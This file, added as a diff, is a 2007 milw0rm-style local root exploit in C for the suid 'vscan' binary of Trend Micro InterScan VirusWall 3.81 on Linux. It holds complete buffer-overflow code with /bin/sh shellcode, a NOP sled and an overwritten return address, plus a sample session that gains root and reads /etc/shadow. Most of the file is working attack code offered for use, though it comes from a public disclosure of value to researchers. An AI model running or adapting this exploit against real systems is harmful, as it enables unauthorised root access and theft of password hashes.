@@ -1,0 +1,155 @@
+/*
+
+    Title: Local root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)
+
+    Author: Sebastian Wolfgarten / sebastian@wolfgarten.com / http://www.devtarget.org
+
+    Date: January 3rd, 2007
+
+    Severity: Medium
+
+    Description:
+
+    The product "InterScan VirusWall 3.81 for Linux" ships a library called 
+    "libvsapi.so" which is vulnerable to a memory corruption vulnerability.
+
+    One of the applications that apparently uses this library is called "vscan"
+    which is set suid root by default. It was discovered that this supporting
+    program is prone to a classic buffer overflow vulnerability when a particularly
+    long command-line argument is being passed and the application utilizes the flawed
+    library to attempt to copy that data into a finite buffer. 
+
+    As vscan is set suid root, this leads to arbitrary code execution with root level
+    privileges. However the severity of this vulnerability is probably "medium" as by default
+    the vscan file is only executable by the root user as well as members of the "iscan"
+    group which is created during the installation of the software.
+
+    Example:
+
+    sebastian@debian31:~$ ./tmvwall381v3_exp
+
+    Local root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)
+    Author: Sebastian Wolfgarten, <sebastian@wolfgarten.com>
+    Date: January 3rd, 2007
+
+    Okay, /opt/trend/ISBASE/IScan.BASE/vscan is executable and by the way, your current user id is 5002.
+
+    Executing /opt/trend/ISBASE/IScan.BASE/vscan. Afterwards check your privilege level with id or whoami!
+    Virus Scanner v3.1, VSAPI v8.310-1002
+    Trend Micro Inc. 1996,1997
+        Pattern number 4.155.00
+
+    sh-2.05b# id
+    uid=5002(sebastian) gid=100(users) euid=0(root) groups=100(users),5001(iscan)
+
+    sh-2.05b# cat /etc/shadow
+
+    root:***REMOVED***:13372:0:99999:7:::
+    daemon:*:13372:0:99999:7:::
+    bin:*:13372:0:99999:7:::
+    sys:*:13372:0:99999:7:::
+    sync:*:13372:0:99999:7:::
+    games:*:13372:0:99999:7:::
+    man:*:13372:0:99999:7:::
+    lp:*:13372:0:99999:7:::
+    mail:*:13372:0:99999:7:::
+    news:*:13372:0:99999:7:::
+    uucp:*:13372:0:99999:7:::
+    proxy:*:13372:0:99999:7:::
+    www-data:*:13372:0:99999:7:::
+    backup:*:13372:0:99999:7:::
+    list:*:13372:0:99999:7:::
+    irc:*:13372:0:99999:7:::
+    gnats:*:13372:0:99999:7:::
+    nobody:*:13372:0:99999:7:::
+    Debian-exim:!:13372:0:99999:7:::
+    sshd:!:13372:0:99999:7:::
+    postfix:!:13500:0:99999:7:::
+    mysql:!:13500:0:99999:7:::
+    vmail:!:13500:0:99999:7:::
+    amavis:!:13500:0:99999:7:::
+    iscan:!:13500:0:99999:7:::
+    sebastian:***REMOVED***:13500:0:99999:7:::
+
+    Credits:
+
+    Must go to Aleph One for the shellcode and mercy for bits of the code.
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define NOP 0x90
+#define vscan "/opt/trend/ISBASE/IScan.BASE/vscan"
+
+// Shellcode by Aleph One
+char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" 
+		   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" 
+                   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+
+    __asm__("movl %esp, %eax");
+
+}
+
+int main(int argc, char *argv[], char **envp) {
+
+    // Size of the vulnerable buffer (1116 + 4 bytes to overwrite EIP)
+    int buff = 1120;
+
+    // Address of the shellcode
+    unsigned long addr;
+
+    // Temporarily used to add nops etc.
+    char *ptr;
+
+    printf("\nLocal root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)\n");
+    printf("Author: Sebastian Wolfgarten, <sebastian@wolfgarten.com>\n");
+    printf("Date: January 3rd, 2007\n\n");
+
+    // Check permissions on vscan executable, if this fails exploitation is infeasible.
+    if (access(vscan, 01) != -1) {
+
+        printf("Okay, %s is executable and by the way, your current user id is %d.\n",vscan,getuid());
+
+	// Allocate memory for filling the buffer
+        if((ptr = (char *)malloc(buff)) == NULL) {
+
+		printf("Error allocating memory!\n");
+		exit(-1);
+
+	}
+
+	// Determine the address of the shellcode with the inline assembly above
+        addr = get_sp();
+
+        // Add the NOP's to the buffer
+        memset(ptr, NOP, buff);
+
+        // Add the shellcode
+        memcpy(ptr + buff - strlen(shellcode) - 8, shellcode, strlen(shellcode));
+
+        // The return address
+        *(long *)&ptr[buff - 4] = addr;
+
+        // Off we go, execute the vulnerable program
+        printf("\nExecuting %s. Afterwards check your privilege level with id or whoami!\n",vscan);
+        execl(vscan, "vscan", ptr, NULL);
+
+    } else {
+
+        printf("Exploit failed. You seem not to have enough privileges to execute %s, sorry.\n",vscan);
+	printf("Hint: Ask your local admin to add yourself to the iscan group or let him make the vscan binary world-executable.\n");
+	printf("Then try again :-)\n\n");
+	exit(1);
+
+    }
+
+    return 0;
+
+}
+
+// milw0rm.com [2007-01-28]
